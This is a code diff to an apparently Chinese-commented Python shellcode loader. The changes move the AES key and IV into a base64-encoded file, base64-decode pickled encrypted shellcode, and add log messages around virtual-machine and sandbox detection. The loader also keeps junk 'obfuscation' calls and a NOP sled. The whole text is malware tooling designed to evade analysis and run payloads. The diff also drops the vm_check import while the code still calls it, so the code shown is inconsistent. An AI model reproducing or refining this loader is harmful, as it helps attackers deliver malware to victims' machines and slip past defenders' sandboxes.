@@ -16,11 +16,11 @@
 import random
 from datetime import datetime
 import time
-import vm_check
 import string
 import requests
 import ctypes
 import pickle
+import base64
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.padding import PKCS7
@@ -39,13 +39,17 @@ def is_sandbox():
     return elapsed - 300 > 100  # 检查实际暂停时间是否显著小于预期时间
 
 
-# 密钥和 IV
-key = b'ljjyyds123456789'
-iv = b'fedcba9876543210'
+# 从文件中读取密钥和 IV
+with open('keywords.txt', 'r') as f:
+    key = base64.b64decode(f.readline().strip())
+    iv = base64.b64decode(f.readline().strip())
 
 # 从文件中加载加密的 shellcode
 with open('encrypted_shellcode.pkl', 'rb') as f:
-    encrypted_shellcode = pickle.load(f)
+    B64EnShellcode = pickle.load(f)
+
+# 使用 Base64 解码
+encrypted_shellcode = base64.b64decode(B64EnShellcode)
 
 # 使用 AES 解密 shellcode
 cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
@@ -59,9 +63,10 @@ shellcode = unpadder.update(decrypted_padded_shellcode) + unpadder.finalize()
 r = vm_check.numberOfCPU() + vm_check.physicalMemory() + vm_check.check_virtual() + vm_check.check_file()
 print(f"VM Check Result: {r}")
 if r < 4:  # 判断是否为虚拟机
-    print("Virtual machine.")
+    print("Virtual machine detected. Exiting.")
     exit()
 if is_sandbox():
+    print("Sandbox detected. Exiting.")
     exit()
 else:
     # 加花
@@ -71,7 +76,7 @@ else:
     print(obfuscation.concatenate_strings("hello", "world"))
     print(obfuscation.is_sorted(obfuscation.num_array))
     print(obfuscation.is_palindrome("radar"))
-    print("Physical machine.")
+    print("Running on a physical machine. Executing shellcode.")
 
     sc = b'\x90' * 16 + shellcode
 
